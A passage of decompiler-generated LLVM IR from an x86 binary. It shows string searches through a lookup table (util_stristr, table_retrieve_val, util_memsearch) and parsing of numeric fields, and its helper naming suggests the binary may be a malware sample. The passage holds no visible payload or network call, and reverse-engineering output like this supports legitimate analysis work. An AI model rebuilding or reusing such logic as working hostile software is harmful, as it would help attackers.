  store i32 %v2_8049962, i32* %v3_804996b, align 4
  %v0_804996c = load i32, i32* @esi, align 4
  %v3_804996c = inttoptr i32 %v0_8049967 to i32*
  store i32 %v0_804996c, i32* %v3_804996c, align 4
  %v4_804996d = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804996d, i32* %eax.global-to-local, align 4
  %v1_8049975 = icmp eq i32 %v4_804996d, 0
  store i1 %v1_8049975, i1* %zf.global-to-local, align 1
  br i1 %v1_8049975, label %dec_label_pc_8049980, label %dec_label_pc_8049979

dec_label_pc_8049979:                             ; preds = %dec_label_pc_8049940
  %v0_8049979 = load i32, i32* @edi, align 4
  %v1_8049979 = add i32 %v0_8049979, 4
  %v2_8049979 = inttoptr i32 %v1_8049979 to i32*
  store i32 1, i32* %v2_8049979, align 4
  br label %dec_label_pc_8049980

dec_label_pc_8049980:                             ; preds = %dec_label_pc_8049940, %dec_label_pc_80498db, %dec_label_pc_80498a9, %dec_label_pc_8049979
  %v0_8049980 = load i32, i32* @edi, align 4
  %v1_8049980 = add i32 %v0_8049980, 8
  %v2_8049980 = inttoptr i32 %v1_8049980 to i32*
  store i32 0, i32* %v2_8049980, align 4
  %v0_8049987 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049987 = load i32, i32* @esp, align 4
  %v2_8049987 = add i32 %v1_8049987, -4
  %v3_8049987 = inttoptr i32 %v2_8049987 to i32*
  store i32 %v0_8049987, i32* %v3_8049987, align 4
  %v0_8049988 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049988 = add i32 %v1_8049987, -8
  %v3_8049988 = inttoptr i32 %v2_8049988 to i32*
  store i32 %v0_8049988, i32* %v3_8049988, align 4
  %v1_8049989 = add i32 %v1_8049987, -12
  %v2_8049989 = inttoptr i32 %v1_8049989 to i32*
  store i32 0, i32* %v2_8049989, align 4
  %v1_804998b = add i32 %v1_8049987, -16
  %v2_804998b = inttoptr i32 %v1_804998b to i32*
  store i32 48, i32* %v2_804998b, align 4
  %v3_804998d = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_804998d, i32* %eax.global-to-local, align 4
  %v0_8049992 = load i32, i32* @esp, align 4
  %v9_8049992 = icmp eq i32 %v0_8049992, -12
  store i1 %v9_8049992, i1* %zf.global-to-local, align 1
  %v2_8049995 = add i32 %v0_8049992, 8
  %v3_8049995 = inttoptr i32 %v2_8049995 to i32*
  store i32 %v3_804998d, i32* %v3_8049995, align 4
  %v1_8049996 = add i32 %v0_8049992, 124
  %v2_8049996 = inttoptr i32 %v1_8049996 to i32*
  %v3_8049996 = load i32, i32* %v2_8049996, align 4
  store i32 %v3_8049996, i32* %eax.global-to-local, align 4
  %v2_804999a = add i32 %v0_8049992, 4
  %v3_804999a = inttoptr i32 %v2_804999a to i32*
  store i32 %v3_8049996, i32* %v3_804999a, align 4
  %v1_804999b = add i32 %v0_8049992, 147
  store i32 %v1_804999b, i32* @ecx, align 4
  %v3_80499a2 = inttoptr i32 %v0_8049992 to i32*
  store i32 %v1_804999b, i32* %v3_80499a2, align 4
  %v4_80499a3 = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  %v0_80499a8 = load i32, i32* @esp, align 4
  %v1_80499a8 = add i32 %v0_80499a8, 16
  %v1_80499ab = add i32 %v4_80499a3, 1
  %v8_80499ab = icmp eq i32 %v1_80499ab, 0
  store i1 %v8_80499ab, i1* %zf.global-to-local, align 1
  store i32 %v1_80499ab, i32* %eax.global-to-local, align 4
  br i1 %v8_80499ab, label %dec_label_pc_8049a57, label %dec_label_pc_80499b2

dec_label_pc_80499b2:                             ; preds = %dec_label_pc_8049980
  %v2_80499b2 = add i32 %v0_80499a8, 12
  %v3_80499b2 = inttoptr i32 %v2_80499b2 to i32*
  store i32 %v1_80499ab, i32* %v3_80499b2, align 4
  %v0_80499b3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80499b3 = add i32 %v0_80499a8, 8
  %v3_80499b3 = inttoptr i32 %v2_80499b3 to i32*
  store i32 %v0_80499b3, i32* %v3_80499b3, align 4
  %v1_80499b4 = add i32 %v0_80499a8, 4
  %v2_80499b4 = inttoptr i32 %v1_80499b4 to i32*
  store i32 0, i32* %v2_80499b4, align 4
  %v2_80499b6 = inttoptr i32 %v0_80499a8 to i32*
  store i32 48, i32* %v2_80499b6, align 4
  %v3_80499b8 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_80499b8, i32* %eax.global-to-local, align 4
  %v0_80499bd = load i32, i32* @esp, align 4
  %v9_80499bd = icmp eq i32 %v0_80499bd, -12
  store i1 %v9_80499bd, i1* %zf.global-to-local, align 1
  %v2_80499c0 = add i32 %v0_80499bd, 8
  %v3_80499c0 = inttoptr i32 %v2_80499c0 to i32*
  store i32 %v3_80499b8, i32* %v3_80499c0, align 4
  %v1_80499c1 = add i32 %v0_80499bd, 124
  %v2_80499c1 = inttoptr i32 %v1_80499c1 to i32*
  %v3_80499c1 = load i32, i32* %v2_80499c1, align 4
  %v2_80499c5 = add i32 %v0_80499bd, 4
  %v3_80499c5 = inttoptr i32 %v2_80499c5 to i32*
  store i32 %v3_80499c1, i32* %v3_80499c5, align 4
  %v1_80499c6 = add i32 %v0_80499bd, 147
  store i32 %v1_80499c6, i32* %eax.global-to-local, align 4
  %v3_80499cd = inttoptr i32 %v0_80499bd to i32*
  store i32 %v1_80499c6, i32* %v3_80499cd, align 4
  %v4_80499ce = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80499ce, i32* %eax.global-to-local, align 4
  %v0_80499d3 = load i32, i32* @esp, align 4
  %v6_80499d3 = icmp eq i32 %v0_80499d3, -16
  store i1 %v6_80499d3, i1* %zf.global-to-local, align 1
  store i32 %v4_80499ce, i32* %ebx.global-to-local, align 4
  %v2_80499d8 = add i32 %v4_80499ce, 147
  %v3_80499d8 = add i32 %v2_80499d8, %v0_80499d3
  %v4_80499d8 = inttoptr i32 %v3_80499d8 to i8*
  %v5_80499d8 = load i8, i8* %v4_80499d8, align 1
  %v11_80499d8 = icmp eq i8 %v5_80499d8, 32
  %v1_80499e0 = zext i1 %v11_80499d8 to i32
  %v1_80499e3 = add i32 %v0_80499d3, 147
  store i32 %v1_80499e3, i32* %esi.global-to-local, align 4
  store i32 %v1_80499e0, i32* %eax.global-to-local, align 4
  %v1_80499ef = add i32 %v0_80499d3, 12
  %v2_80499ef = inttoptr i32 %v1_80499ef to i32*
  store i32 2, i32* %v2_80499ef, align 4
  %v1_80499f1 = add i32 %v0_80499d3, 8
  %v2_80499f1 = inttoptr i32 %v1_80499f1 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_80499f1, align 4
  %v0_80499f6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80499f6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80499f6 = add i32 %v1_80499f6, %v0_80499f6
  store i32 %v2_80499f6, i32* @ebx, align 4
  %v1_80499f8 = add i32 %v0_80499d3, 124
  %v2_80499f8 = inttoptr i32 %v1_80499f8 to i32*
  %v3_80499f8 = load i32, i32* %v2_80499f8, align 4
  %v2_80499fc = sub i32 %v3_80499f8, %v2_80499f6
  store i32 %v2_80499fc, i32* %eax.global-to-local, align 4
  %v0_80499fe = load i32, i32* %esi.global-to-local, align 4
  %v2_80499fe = add i32 %v0_80499fe, %v2_80499f6
  %v12_80499fe = icmp eq i32 %v2_80499fe, 0
  store i1 %v12_80499fe, i1* %zf.global-to-local, align 1
  store i32 %v2_80499fe, i32* @esi, align 4
  %v2_8049a00 = add i32 %v0_80499d3, 4
  %v3_8049a00 = inttoptr i32 %v2_8049a00 to i32*
  store i32 %v2_80499fc, i32* %v3_8049a00, align 4
  %v0_8049a01 = load i32, i32* @esi, align 4
  %v3_8049a01 = inttoptr i32 %v0_80499d3 to i32*
  store i32 %v0_8049a01, i32* %v3_8049a01, align 4
  %v4_8049a02 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049a02, i32* %eax.global-to-local, align 4
  %v0_8049a07 = load i32, i32* @esp, align 4
  %v1_8049a07 = add i32 %v0_8049a07, 16
  %v10_8049a0a = icmp eq i32 %v4_8049a02, -1
  store i1 %v10_8049a0a, i1* %zf.global-to-local, align 1
  br i1 %v10_8049a0a, label %dec_label_pc_8049a57, label %dec_label_pc_8049a0f

dec_label_pc_8049a0f:                             ; preds = %dec_label_pc_80499b2
  %v10_8049a0f = icmp eq i32 %v4_8049a02, 1
  store i1 %v10_8049a0f, i1* %zf.global-to-local, align 1
  %v7_8049a12 = icmp sgt i32 %v4_8049a02, 1
  br i1 %v7_8049a12, label %dec_label_pc_8049a14, label %dec_label_pc_8049a17

dec_label_pc_8049a14:                             ; preds = %dec_label_pc_8049a0f
  %v1_8049a14 = add i32 %v4_8049a02, -2
  %v9_8049a14 = icmp eq i32 %v1_8049a14, 0
  store i1 %v9_8049a14, i1* %zf.global-to-local, align 1
  store i32 %v1_8049a14, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049a17

dec_label_pc_8049a17:                             ; preds = %dec_label_pc_8049a0f, %dec_label_pc_8049a14
  %v1_8049a1e = phi i32 [ %v4_8049a02, %dec_label_pc_8049a0f ], [ %v1_8049a14, %dec_label_pc_8049a14 ]
  %v1_8049a17 = add i32 %v0_8049a07, 20920
  store i32 %v1_8049a17, i32* %edx.global-to-local, align 4
  %v2_8049a1e = add i32 %v1_8049a1e, %v1_8049a17
  store i32 %v2_8049a1e, i32* %eax.global-to-local, align 4
  %v0_8049a21 = load i32, i32* @ebx, align 4
  %v2_8049a21 = add i32 %v2_8049a1e, -20773
  %v3_8049a21 = add i32 %v2_8049a21, %v0_8049a21
  %v4_8049a21 = inttoptr i32 %v3_8049a21 to i8*
  store i8 0, i8* %v4_8049a21, align 1
  %v0_8049a29 = load i32, i32* @ebp, align 4
  %v1_8049a29 = load i32, i32* @esp, align 4
  %v2_8049a29 = add i32 %v1_8049a29, -4
  %v3_8049a29 = inttoptr i32 %v2_8049a29 to i32*
  store i32 %v0_8049a29, i32* %v3_8049a29, align 4
  %v0_8049a2a = load i32, i32* @ebp, align 4
  %v2_8049a2a = add i32 %v1_8049a29, -8
  %v3_8049a2a = inttoptr i32 %v2_8049a2a to i32*
  store i32 %v0_8049a2a, i32* %v3_8049a2a, align 4
  %v1_8049a2b = add i32 %v1_8049a29, -12
  %v2_8049a2b = inttoptr i32 %v1_8049a2b to i32*
  store i32 0, i32* %v2_8049a2b, align 4
  %v1_8049a2d = add i32 %v1_8049a29, -16
  %v2_8049a2d = inttoptr i32 %v1_8049a2d to i32*
  store i32 49, i32* %v2_8049a2d, align 4
  %v3_8049a2f = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049a2f, i32* %eax.global-to-local, align 4
  %v0_8049a34 = load i32, i32* @esi, align 4
  %v1_8049a34 = load i32, i32* @esp, align 4
  %v2_8049a34 = inttoptr i32 %v1_8049a34 to i32*
  store i32 %v0_8049a34, i32* %v2_8049a34, align 4
  store i32 %v3_8049a2f, i32* @ebx, align 4
  %v2_8049a39 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049a39, i32* %eax.global-to-local, align 4
  %v0_8049a3e = load i32, i32* @esp, align 4
  %v9_8049a3e = icmp eq i32 %v0_8049a3e, -12
  store i1 %v9_8049a3e, i1* %zf.global-to-local, align 1
  %v0_8049a41 = load i32, i32* @ebx, align 4
  %v2_8049a41 = add i32 %v0_8049a3e, 8
  %v3_8049a41 = inttoptr i32 %v2_8049a41 to i32*
  store i32 %v0_8049a41, i32* %v3_8049a41, align 4
  %v2_8049a42 = add i32 %v0_8049a3e, 4
  %v3_8049a42 = inttoptr i32 %v2_8049a42 to i32*
  store i32 %v2_8049a39, i32* %v3_8049a42, align 4
  %v0_8049a43 = load i32, i32* @esi, align 4
  %v3_8049a43 = inttoptr i32 %v0_8049a3e to i32*
  store i32 %v0_8049a43, i32* %v3_8049a43, align 4
  %v4_8049a44 = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049a44, i32* %eax.global-to-local, align 4
  %v0_8049a49 = load i32, i32* @esp, align 4
  %v1_8049a49 = add i32 %v0_8049a49, 16
  %v1_8049a4c = icmp eq i32 %v4_8049a44, 0
  store i1 %v1_8049a4c, i1* %zf.global-to-local, align 1
  br i1 %v1_8049a4c, label %dec_label_pc_8049a57, label %dec_label_pc_8049a50

dec_label_pc_8049a50:                             ; preds = %dec_label_pc_8049a17
  %v0_8049a50 = load i32, i32* @edi, align 4
  %v1_8049a50 = add i32 %v0_8049a50, 8
  %v2_8049a50 = inttoptr i32 %v1_8049a50 to i32*
  store i32 1, i32* %v2_8049a50, align 4
  %v1_8049a57.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049a57

dec_label_pc_8049a57:                             ; preds = %dec_label_pc_8049a17, %dec_label_pc_80499b2, %dec_label_pc_8049980, %dec_label_pc_8049a50
  %v1_8049a57 = phi i32 [ %v1_8049a49, %dec_label_pc_8049a17 ], [ %v1_8049a07, %dec_label_pc_80499b2 ], [ %v1_80499a8, %dec_label_pc_8049980 ], [ %v1_8049a57.pre, %dec_label_pc_8049a50 ]
  %v0_8049a57 = load i32, i32* @esi, align 4
  %v2_8049a57 = add i32 %v1_8049a57, -4
  %v3_8049a57 = inttoptr i32 %v2_8049a57 to i32*
  store i32 %v0_8049a57, i32* %v3_8049a57, align 4
  %v0_8049a58 = load i32, i32* @esi, align 4
  %v2_8049a58 = add i32 %v1_8049a57, -8
  %v3_8049a58 = inttoptr i32 %v2_8049a58 to i32*
  store i32 %v0_8049a58, i32* %v3_8049a58, align 4
  %v1_8049a59 = add i32 %v1_8049a57, -12
  %v2_8049a59 = inttoptr i32 %v1_8049a59 to i32*
  store i32 0, i32* %v2_8049a59, align 4
  %v1_8049a5b = add i32 %v1_8049a57, -16
  %v2_8049a5b = inttoptr i32 %v1_8049a5b to i32*
  store i32 47, i32* %v2_8049a5b, align 4
  %v3_8049a5d = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049a5d, i32* %eax.global-to-local, align 4
  %v0_8049a62 = load i32, i32* @esp, align 4
  %v9_8049a62 = icmp eq i32 %v0_8049a62, -12
  store i1 %v9_8049a62, i1* %zf.global-to-local, align 1
  %v2_8049a65 = add i32 %v0_8049a62, 8
  %v3_8049a65 = inttoptr i32 %v2_8049a65 to i32*
  store i32 %v3_8049a5d, i32* %v3_8049a65, align 4
  %v1_8049a66 = add i32 %v0_8049a62, 124
  %v2_8049a66 = inttoptr i32 %v1_8049a66 to i32*
  %v3_8049a66 = load i32, i32* %v2_8049a66, align 4
  %v2_8049a6a = add i32 %v0_8049a62, 4
  %v3_8049a6a = inttoptr i32 %v2_8049a6a to i32*
  store i32 %v3_8049a66, i32* %v3_8049a6a, align 4
  %v1_8049a6b = add i32 %v0_8049a62, 147
  store i32 %v1_8049a6b, i32* @ecx, align 4
  %v3_8049a72 = inttoptr i32 %v0_8049a62 to i32*
  store i32 %v1_8049a6b, i32* %v3_8049a72, align 4
  %v4_8049a73 = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  %v0_8049a78 = load i32, i32* @esp, align 4
  %v1_8049a7b = add i32 %v4_8049a73, 1
  %v8_8049a7b = icmp eq i32 %v1_8049a7b, 0
  store i1 %v8_8049a7b, i1* %zf.global-to-local, align 1
  store i32 %v1_8049a7b, i32* %eax.global-to-local, align 4
  br i1 %v8_8049a7b, label %dec_label_pc_8049f45, label %dec_label_pc_8049a82

dec_label_pc_8049a82:                             ; preds = %dec_label_pc_8049a57
  %v0_8049a82 = load i32, i32* @ecx, align 4
  %v2_8049a82 = add i32 %v0_8049a78, 12
  %v3_8049a82 = inttoptr i32 %v2_8049a82 to i32*
  store i32 %v0_8049a82, i32* %v3_8049a82, align 4
  %v0_8049a83 = load i32, i32* @ecx, align 4
  %v2_8049a83 = add i32 %v0_8049a78, 8
  %v3_8049a83 = inttoptr i32 %v2_8049a83 to i32*
  store i32 %v0_8049a83, i32* %v3_8049a83, align 4
  %v1_8049a84 = add i32 %v0_8049a78, 4
  %v2_8049a84 = inttoptr i32 %v1_8049a84 to i32*
  store i32 0, i32* %v2_8049a84, align 4
  %v2_8049a86 = inttoptr i32 %v0_8049a78 to i32*
  store i32 47, i32* %v2_8049a86, align 4
  %v3_8049a88 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049a88, i32* %eax.global-to-local, align 4
  %v0_8049a8d = load i32, i32* @esp, align 4
  %v9_8049a8d = icmp eq i32 %v0_8049a8d, -12
  store i1 %v9_8049a8d, i1* %zf.global-to-local, align 1
  %v2_8049a90 = add i32 %v0_8049a8d, 8
  %v3_8049a90 = inttoptr i32 %v2_8049a90 to i32*
  store i32 %v3_8049a88, i32* %v3_8049a90, align 4
  %v1_8049a91 = add i32 %v0_8049a8d, 124
  %v2_8049a91 = inttoptr i32 %v1_8049a91 to i32*
  %v3_8049a91 = load i32, i32* %v2_8049a91, align 4
  store i32 %v3_8049a91, i32* @edx, align 4
  %v2_8049a95 = add i32 %v0_8049a8d, 4
  %v3_8049a95 = inttoptr i32 %v2_8049a95 to i32*
  store i32 %v3_8049a91, i32* %v3_8049a95, align 4
  %v1_8049a96 = add i32 %v0_8049a8d, 147
  store i32 %v1_8049a96, i32* %eax.global-to-local, align 4
  %v3_8049a9d = inttoptr i32 %v0_8049a8d to i32*
  store i32 %v1_8049a96, i32* %v3_8049a9d, align 4
  %v4_8049a9e = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049a9e, i32* %eax.global-to-local, align 4
  %v0_8049aa3 = load i32, i32* @esp, align 4
  %v6_8049aa3 = icmp eq i32 %v0_8049aa3, -16
  store i1 %v6_8049aa3, i1* %zf.global-to-local, align 1
  store i32 %v4_8049a9e, i32* %ebx.global-to-local, align 4
  %v2_8049aa8 = add i32 %v4_8049a9e, 147
  %v3_8049aa8 = add i32 %v2_8049aa8, %v0_8049aa3
  %v4_8049aa8 = inttoptr i32 %v3_8049aa8 to i8*
  %v5_8049aa8 = load i8, i8* %v4_8049aa8, align 1
  %v11_8049aa8 = icmp eq i8 %v5_8049aa8, 32
  %v1_8049ab0 = zext i1 %v11_8049aa8 to i32
  %v1_8049ab3 = add i32 %v0_8049aa3, 147
  store i32 %v1_8049ab3, i32* %esi.global-to-local, align 4
  store i32 %v1_8049ab0, i32* %eax.global-to-local, align 4
  %v1_8049abf = add i32 %v0_8049aa3, 12
  %v2_8049abf = inttoptr i32 %v1_8049abf to i32*
  store i32 2, i32* %v2_8049abf, align 4
  %v1_8049ac1 = add i32 %v0_8049aa3, 8
  %v2_8049ac1 = inttoptr i32 %v1_8049ac1 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_8049ac1, align 4
  %v0_8049ac6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049ac6 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049ac6 = add i32 %v1_8049ac6, %v0_8049ac6
  store i32 %v2_8049ac6, i32* @ebx, align 4
  %v1_8049ac8 = add i32 %v0_8049aa3, 124
  %v2_8049ac8 = inttoptr i32 %v1_8049ac8 to i32*
  %v3_8049ac8 = load i32, i32* %v2_8049ac8, align 4
  %v2_8049acc = sub i32 %v3_8049ac8, %v2_8049ac6
  store i32 %v2_8049acc, i32* %eax.global-to-local, align 4
  %v0_8049ace = load i32, i32* %esi.global-to-local, align 4
  %v2_8049ace = add i32 %v0_8049ace, %v2_8049ac6
  %v12_8049ace = icmp eq i32 %v2_8049ace, 0
  store i1 %v12_8049ace, i1* %zf.global-to-local, align 1
  store i32 %v2_8049ace, i32* @esi, align 4
  %v2_8049ad0 = add i32 %v0_8049aa3, 4
  %v3_8049ad0 = inttoptr i32 %v2_8049ad0 to i32*
  store i32 %v2_8049acc, i32* %v3_8049ad0, align 4
  %v0_8049ad1 = load i32, i32* @esi, align 4
  %v3_8049ad1 = inttoptr i32 %v0_8049aa3 to i32*
  store i32 %v0_8049ad1, i32* %v3_8049ad1, align 4
  %v4_8049ad2 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049ad2, i32* %eax.global-to-local, align 4
  %v0_8049ad7 = load i32, i32* @esp, align 4
  %v10_8049ada = icmp eq i32 %v4_8049ad2, -1
  store i1 %v10_8049ada, i1* %zf.global-to-local, align 1
  br i1 %v10_8049ada, label %dec_label_pc_8049b09, label %dec_label_pc_8049adf

dec_label_pc_8049adf:                             ; preds = %dec_label_pc_8049a82
  %v10_8049adf = icmp eq i32 %v4_8049ad2, 1
  store i1 %v10_8049adf, i1* %zf.global-to-local, align 1
  %v7_8049ae2 = icmp sgt i32 %v4_8049ad2, 1
  br i1 %v7_8049ae2, label %dec_label_pc_8049ae4, label %dec_label_pc_8049ae7

dec_label_pc_8049ae4:                             ; preds = %dec_label_pc_8049adf
  %v1_8049ae4 = add i32 %v4_8049ad2, -2
  %v9_8049ae4 = icmp eq i32 %v1_8049ae4, 0
  store i1 %v9_8049ae4, i1* %zf.global-to-local, align 1
  store i32 %v1_8049ae4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049ae7

dec_label_pc_8049ae7:                             ; preds = %dec_label_pc_8049adf, %dec_label_pc_8049ae4
  %v1_8049aee = phi i32 [ %v4_8049ad2, %dec_label_pc_8049adf ], [ %v1_8049ae4, %dec_label_pc_8049ae4 ]
  %v1_8049ae7 = add i32 %v0_8049ad7, 20920
  store i32 %v1_8049ae7, i32* %edx.global-to-local, align 4
  %v2_8049aee = add i32 %v1_8049aee, %v1_8049ae7
  store i32 %v2_8049aee, i32* @eax, align 4
  %v0_8049af1 = load i32, i32* @ebx, align 4
  %v2_8049af1 = add i32 %v2_8049aee, -20773
  %v3_8049af1 = add i32 %v2_8049af1, %v0_8049af1
  %v4_8049af1 = inttoptr i32 %v3_8049af1 to i8*
  store i8 0, i8* %v4_8049af1, align 1
  %v0_8049af9 = load i32, i32* @eax, align 4
  %v1_8049af9 = load i32, i32* @esp, align 4
  %v2_8049af9 = add i32 %v1_8049af9, -4
  %v3_8049af9 = inttoptr i32 %v2_8049af9 to i32*
  store i32 %v0_8049af9, i32* %v3_8049af9, align 4
  %v0_8049afa = load i32, i32* @eax, align 4
  %v2_8049afa = add i32 %v1_8049af9, -8
  %v3_8049afa = inttoptr i32 %v2_8049afa to i32*
  store i32 %v0_8049afa, i32* %v3_8049afa, align 4
  %v1_8049afb = add i32 %v1_8049af9, -12
  %v2_8049afb = inttoptr i32 %v1_8049afb to i32*
  store i32 10, i32* %v2_8049afb, align 4
  %v0_8049afd = load i32, i32* @esi, align 4
  %v2_8049afd = add i32 %v1_8049af9, -16
  %v3_8049afd = inttoptr i32 %v2_8049afd to i32*
  store i32 %v0_8049afd, i32* %v3_8049afd, align 4
  %v3_8049afe = call i32 @util_atoi(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049afe, i32* %eax.global-to-local, align 4
  %v0_8049b03 = load i32, i32* @esp, align 4
  %v6_8049b03 = icmp eq i32 %v0_8049b03, -16
  store i1 %v6_8049b03, i1* %zf.global-to-local, align 1
  %v1_8049b06 = load i32, i32* @edi, align 4
  %v2_8049b06 = add i32 %v1_8049b06, 12
  %v3_8049b06 = inttoptr i32 %v2_8049b06 to i32*
  store i32 %v3_8049afe, i32* %v3_8049b06, align 4
  br label %dec_label_pc_8049b09

dec_label_pc_8049b09:                             ; preds = %dec_label_pc_8049a82, %dec_label_pc_8049f45, %dec_label_pc_8049ae7
  store i1 true, i1* %zf.global-to-local, align 1
  %v1_8049b0b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049b0b

dec_label_pc_8049b0b:                             ; preds = %dec_label_pc_8049c3d, %dec_label_pc_8049b09
  %v1_8049b0b = phi i32 [ %v1_8049b0b.pre, %dec_label_pc_8049b09 ], [ %v0_8049c3d, %dec_label_pc_8049c3d ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8049b09 ], [ %v3_8049c3d, %dec_label_pc_8049c3d ]
  store i32 %storemerge3, i32* @esi, align 4
  %v0_8049b0b = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b0b = add i32 %v1_8049b0b, -4
  %v3_8049b0b = inttoptr i32 %v2_8049b0b to i32*
  store i32 %v0_8049b0b, i32* %v3_8049b0b, align 4
  %v0_8049b0c = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b0c = add i32 %v1_8049b0b, -8
  %v3_8049b0c = inttoptr i32 %v2_8049b0c to i32*
  store i32 %v0_8049b0c, i32* %v3_8049b0c, align 4
  %v1_8049b0d = add i32 %v1_8049b0b, -12
  %v2_8049b0d = inttoptr i32 %v1_8049b0d to i32*
  store i32 0, i32* %v2_8049b0d, align 4
  %v1_8049b0f = add i32 %v1_8049b0b, -16
  %v2_8049b0f = inttoptr i32 %v1_8049b0f to i32*
  store i32 46, i32* %v2_8049b0f, align 4
  %v3_8049b11 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049b11, i32* %eax.global-to-local, align 4
  %v0_8049b16 = load i32, i32* @esp, align 4
  %v1_8049b16 = add i32 %v0_8049b16, 147
  %v1_8049b20 = load i32, i32* @esi, align 4
  %v2_8049b20 = add i32 %v1_8049b16, %v1_8049b20
  %v12_8049b20 = icmp eq i32 %v2_8049b20, 0
  store i1 %v12_8049b20, i1* %zf.global-to-local, align 1
  store i32 %v2_8049b20, i32* @ebx, align 4
  %v2_8049b22 = add i32 %v0_8049b16, 8
  %v3_8049b22 = inttoptr i32 %v2_8049b22 to i32*
  store i32 %v3_8049b11, i32* %v3_8049b22, align 4
  %v1_8049b23 = add i32 %v0_8049b16, 124
  %v2_8049b23 = inttoptr i32 %v1_8049b23 to i32*
  %v3_8049b23 = load i32, i32* %v2_8049b23, align 4
  store i32 %v3_8049b23, i32* %eax.global-to-local, align 4
  %v2_8049b27 = add i32 %v0_8049b16, 4
  %v3_8049b27 = inttoptr i32 %v2_8049b27 to i32*
  store i32 %v3_8049b23, i32* %v3_8049b27, align 4
  %v0_8049b28 = load i32, i32* @ebx, align 4
  %v3_8049b28 = inttoptr i32 %v0_8049b16 to i32*
  store i32 %v0_8049b28, i32* %v3_8049b28, align 4
  %v4_8049b29 = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  %v0_8049b2e = load i32, i32* @esp, align 4
  %v1_8049b31 = add i32 %v4_8049b29, 1
  %v8_8049b31 = icmp eq i32 %v1_8049b31, 0
  store i1 %v8_8049b31, i1* %zf.global-to-local, align 1
  store i32 %v1_8049b31, i32* %eax.global-to-local, align 4
  br i1 %v8_8049b31, label %dec_label_pc_8049dce, label %dec_label_pc_8049b38

dec_label_pc_8049b38:                             ; preds = %dec_label_pc_8049b0b
  %v0_8049b38 = load i32, i32* @edi, align 4
  %v1_8049b38 = add i32 %v0_8049b38, 16
  %v2_8049b38 = inttoptr i32 %v1_8049b38 to i32*
  %v3_8049b38 = load i32, i32* %v2_8049b38, align 4
  %v4_8049b38 = add i32 %v3_8049b38, -4
  %v9_8049b38 = sub i32 3, %v3_8049b38
  %v10_8049b38 = and i32 %v9_8049b38, %v3_8049b38
  %v11_8049b38 = icmp slt i32 %v10_8049b38, 0
  %v12_8049b38 = icmp eq i32 %v4_8049b38, 0
  store i1 %v12_8049b38, i1* %zf.global-to-local, align 1
  %v13_8049b38 = icmp slt i32 %v4_8049b38, 0
  %v3_8049b3c = icmp eq i1 %v13_8049b38, %v11_8049b38
  %v4_8049b3c = icmp eq i1 %v12_8049b38, false
  %v5_8049b3c = and i1 %v4_8049b3c, %v3_8049b3c
  br i1 %v5_8049b3c, label %dec_label_pc_8049dce, label %dec_label_pc_8049b42

dec_label_pc_8049b42:                             ; preds = %dec_label_pc_8049b38
  %v2_8049b42 = add i32 %v0_8049b2e, 12
  %v3_8049b42 = inttoptr i32 %v2_8049b42 to i32*
  store i32 %v1_8049b31, i32* %v3_8049b42, align 4
  %v0_8049b43 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b43 = add i32 %v0_8049b2e, 8
  %v3_8049b43 = inttoptr i32 %v2_8049b43 to i32*
  store i32 %v0_8049b43, i32* %v3_8049b43, align 4
  %v1_8049b44 = add i32 %v0_8049b2e, 4
  %v2_8049b44 = inttoptr i32 %v1_8049b44 to i32*
  store i32 0, i32* %v2_8049b44, align 4
  %v2_8049b46 = inttoptr i32 %v0_8049b2e to i32*
  store i32 46, i32* %v2_8049b46, align 4
  %v3_8049b48 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049b48, i32* %eax.global-to-local, align 4
  %v0_8049b4d = load i32, i32* @esp, align 4
  %v9_8049b4d = icmp eq i32 %v0_8049b4d, -12
  store i1 %v9_8049b4d, i1* %zf.global-to-local, align 1
